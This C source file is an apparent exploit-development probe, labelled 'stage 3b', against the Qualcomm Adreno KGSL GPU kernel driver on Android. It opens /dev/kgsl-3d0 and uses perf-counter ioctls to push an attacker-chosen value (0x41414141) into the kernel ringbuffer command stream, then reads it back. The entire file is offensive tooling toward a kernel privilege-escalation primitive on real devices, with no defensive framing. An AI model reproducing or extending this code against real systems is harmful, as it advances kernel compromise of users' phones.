/*
 * kgsl_perfcounter_probe.c - stage 3b: reach the profiling RB-write path.
 *
 * 1. IOCTL_KGSL_PERFCOUNTER_QUERY  (0x3A) group CP -> list valid countables
 * 2. IOCTL_KGSL_PERFCOUNTER_GET    (0x38) with a *custom* countable
 *    -> adreno_perfcounter_enable -> _perfcounter_enable_default ->
 *       adreno_ringbuffer_issuecmds(rb0, [WAIT_FOR_IDLE][type4 reg][countable])
 *       i.e. our 32-bit value lands in rb0's command stream.
 * 3. IOCTL_KGSL_PERFCOUNTER_READ   (0x3B) -> read back the counter value.
 * 4. IOCTL_KGSL_PERFCOUNTER_PUT    (0x39) -> release.
 *
 * Build: zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding -fno-builtin -O2 -Wl,-e,_start -o kgsl_perfcounter_probe kgsl_perfcounter_probe.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_perfcounter_get{u32 groupid;u32 countable;u32 offset;u32 offset_hi;u32 pad;};
#define IOCTL_PERFCOUNTER_GET IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x38,sizeof(struct kgsl_perfcounter_get))
struct kgsl_perfcounter_put{u32 groupid;u32 countable;u32 pad[2];};
#define IOCTL_PERFCOUNTER_PUT IOC(_IOC_WRITE,KGSL_MAGIC,0x39,sizeof(struct kgsl_perfcounter_put))
struct kgsl_perfcounter_query{u32 groupid;u32 countables;u32 count;u32 max_counters;u32 pad[2];};
#define IOCTL_PERFCOUNTER_QUERY IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x3A,sizeof(struct kgsl_perfcounter_query))
struct kgsl_perfcounter_read_group{u32 groupid;u32 countable;u64 value;};
struct kgsl_perfcounter_read{u64 reads;u32 count;u32 pad[2];};
#define IOCTL_PERFCOUNTER_READ IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x3B,sizeof(struct kgsl_perfcounter_read))
#define KGSL_PERFCOUNTER_GROUP_CP 0x0u

void _start(void){
    out("[*] kgsl_perfcounter_probe\n");
    long fd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    out("[1] open = ");outdec(fd);out("\n");
    if(fd<0){sys3(SYS_exit,1,0,0);return;}

    /* query group CP for valid countables */
    u32 cnts[16]; for(int i=0;i<16;i++) cnts[i]=0;
    struct kgsl_perfcounter_query q; q.groupid=KGSL_PERFCOUNTER_GROUP_CP; q.countables=(u32)(u64)cnts; q.count=16; q.max_counters=16; q.pad[0]=0; q.pad[1]=0;
    long r=sys3(SYS_ioctl,fd,IOCTL_PERFCOUNTER_QUERY,(s64)&q);
    out("[2] QUERY group CP ret=");outdec(r);out(" count=");outdec(q.count);out("\n");
    for(u32 i=0;i<q.count && i<8;i++){ out("    countable[");outdec(i);out("]=");outhex(cnts[i]);out("\n"); }

    /* GET with custom countable -> triggers RB write of the value */
    u32 custom=0x41414141u;
    struct kgsl_perfcounter_get g; g.groupid=KGSL_PERFCOUNTER_GROUP_CP; g.countable=custom; g.offset=0; g.offset_hi=0; g.pad=0;
    r=sys3(SYS_ioctl,fd,IOCTL_PERFCOUNTER_GET,(s64)&g);
    out("[3] GET custom countable ret=");outdec(r);out(" offset=");outhex(g.offset);out(" offset_hi=");outhex(g.offset_hi);out("\n");

    /* READ it back */
    struct kgsl_perfcounter_read_group rg; rg.groupid=KGSL_PERFCOUNTER_GROUP_CP; rg.countable=custom; rg.value=0;
    struct kgsl_perfcounter_read rd; rd.reads=(u64)&rg; rd.count=1; rd.pad[0]=0; rd.pad[1]=0;
    r=sys3(SYS_ioctl,fd,IOCTL_PERFCOUNTER_READ,(s64)&rd);
    out("[4] READ ret=");outdec(r);out(" value=");outhex(rg.value);out("\n");

    struct kgsl_perfcounter_put p; p.groupid=KGSL_PERFCOUNTER_GROUP_CP; p.countable=custom; p.pad[0]=0; p.pad[1]=0;
    r=sys3(SYS_ioctl,fd,IOCTL_PERFCOUNTER_PUT,(s64)&p);
    out("[5] PUT ret=");outdec(r);out("\n");
    out("[*] done\n");
    sys3(SYS_close,fd,0,0);
    sys3(SYS_exit,0,0,0);
}
